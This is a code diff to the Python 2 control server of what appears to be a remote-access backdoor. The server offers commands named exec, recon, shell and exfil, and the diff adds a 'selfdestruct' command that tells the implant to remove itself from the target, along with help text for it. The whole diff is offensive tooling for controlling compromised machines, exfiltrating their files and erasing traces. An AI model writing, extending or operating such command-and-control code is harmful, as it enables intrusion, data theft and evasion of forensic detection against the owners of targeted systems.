@@ -31,7 +31,7 @@ def get_args():
 
 
 def shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil']
+    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil', 'selfdestruct']
     print '[+] ({}) Entering control shell'.format(datetime.now())
     conn, addr = s.accept()
     prompt = shell_exchange(conn, 'getprompt')
@@ -89,6 +89,22 @@ def shell_server(s, PORT):
                                     file.split('/')[-1].strip('.'))
                 else:
                     shell_cmd_help(cmds, 5)
+            # selfdestruct
+            elif base == cmds[6]:
+                if inp == 'selfdestruct':
+                    print """[!] WARNING: You are about to permanently remove the client from the target.
+    You will immediately lose access to the target. Continue? (y/n)""",
+                    if raw_input().lower()[0] == 'y':
+                        resp = shell_exchange(conn, 'selfdestruct')
+                        if resp == 'boom':
+                            print '[+] ({}) Exiting control shell.'.format(datetime.now())
+                            return
+                        else:
+                            print 'psh : Self destruct error: {}.'.format(resp)
+                    else:
+                        print 'psh : Aborting self destruct.'
+                else:
+                    shell_cmd_help(cmds, 6)
             else:
                 print 'psh: {}: command not found'.format(base)
         except KeyboardInterrupt:
@@ -152,6 +168,12 @@ def shell_cmd_help(cmds, ind):
         print 'Exfiltrate files.'
         print 'usage: exfil [-h] file1 [file2 file3 ...]'
         print '\nDownloads files to {}/'.format(OUT)
+        print '\noptions:'
+        print '-h\t\tshow help'
+    elif ind == 6:
+        print 'Self destruct.'
+        print 'usage: selfdestruct [-h]'
+        print '\nPermanently remove client from target.'
         print '\noptions:'
         print '-h\t\tshow help'
 
